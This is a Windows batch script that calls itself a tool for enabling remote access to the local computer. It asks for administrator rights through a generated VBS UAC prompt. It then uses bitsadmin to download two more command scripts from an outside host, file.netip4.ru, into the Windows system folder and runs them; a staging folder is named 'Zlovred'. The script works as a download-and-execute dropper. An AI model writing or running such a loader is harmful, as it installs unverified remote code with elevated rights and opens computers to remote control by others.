@echo on
rem *******************************************************
rem nit-remoteenable-run.cmd
rem This Script will Download and Execute the Commands for Enabling 
rem Remote Access to Local Computer
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

set PRODUCT_NAME=RemoteOpen
set REDACT=
set FIRM=NIT
set PRODUCT_FOLDER_REMOTE=%FIRM%/%PRODUCT_NAME%/

rem Set a Directory
rem

set CURDIR=%CD%

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem Set Working Directory (may be Changed)
rem
set WorkingDir=%SystemRoot%

rem Set Host
rem
set aPrefix=http
set aDomain=file.netip4.ru
set aPort=80
set aRemoteDir=/PROGS/%PRODUCT_FOLDER_REMOTE%

set host=%aPrefix%://%aDomain%:%aPort%%aRemoteDir%

echo Download and Run Payload..
rem
title Installing Packages
::-------------------------------------
REM  --> CheckING for permissions
net session >nul 2>&1

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
rem Lock Data
rem exit /b 17
rem
set getadminvbs=nit-%~n0.vbs
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TPDL%\%getadminvbs%"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%TPDL%\%getadminvbs%"

    %wscriptexe% "%TPDL%\%getadminvbs%"
    del "%TPDL%\%getadminvbs%"
    exit /B 0

:gotAdmin
echo Run as Admin...

rem Download Payloads
rem
bitsadmin.exe /Transfer RemoteEnable0 /DOWNLOAD /PRIORITY FOREGROUND ^
%host%nit-remoteenable-download.cmd %WorkingDir%\nit-remoteenable-download.cmd ^
%host%nit-remoteenable-executing.cmd %WorkingDir%\nit-remoteenable-executing.cmd

rem Run Payloads
rem

call %WorkingDir%\nit-remoteenable-download.cmd
call %WorkingDir%\nit-remoteenable-executing.cmd


echo The End of the Script %0
exit /b 0
